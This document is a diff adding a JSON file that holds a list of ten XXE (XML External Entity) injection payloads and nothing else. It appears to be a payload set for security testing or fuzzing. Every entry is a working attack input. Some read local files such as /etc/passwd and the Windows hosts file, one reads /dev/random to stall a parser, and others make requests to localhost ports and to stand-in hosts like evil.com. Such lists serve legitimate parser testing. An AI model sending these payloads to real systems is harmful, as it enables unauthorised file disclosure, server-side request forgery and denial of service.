@@ -1,0 +1,14 @@
+{
+  "payloads": [
+    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ \n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> \n]>\n<root>\n  <data>&xxe;</data>\n</root>",
+    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ \n  <!ENTITY xxe SYSTEM \"http://evil.com/malicious_file\"> \n]>\n<root>\n  <data>&xxe;</data>\n</root>",
+    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ \n  <!ENTITY xxe SYSTEM \"ftp://localhost:21\"> \n]>\n<root>\n  <data>&xxe;</data>\n</root>",
+    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ \n  <!ENTITY xxe SYSTEM \"http://localhost:8080/evil_file\"> \n]>\n<root>\n  <data>&xxe;</data>\n</root>",
+    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ \n  <!ENTITY xxe SYSTEM \"file:///C:/Windows/System32/drivers/etc/hosts\"> \n]>\n<root>\n  <data>&xxe;</data>\n</root>",
+    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ \n  <!ENTITY xxe SYSTEM \"file:///dev/random\"> \n]>\n<root>\n  <data>&xxe;</data>\n</root>",
+    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ \n  <!ENTITY xxe SYSTEM \"file:///var/www/html/index.html\"> \n]>\n<root>\n  <data>&xxe;</data>\n</root>",
+    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ \n  <!ENTITY xxe SYSTEM \"http://localhost/test_file\"> \n]>\n<root>\n  <data>&xxe;</data>\n</root>",
+    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ \n  <!ENTITY xxe SYSTEM \"http://example.com/malicious_file\"> \n]>\n<root>\n  <data>&xxe;</data>\n</root>",
+    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ \n  <!ENTITY xxe SYSTEM \"file:///tmp/sensitive_data.txt\"> \n]>\n<root>\n  <data>&xxe;</data>\n</root>"
+  ]
+}
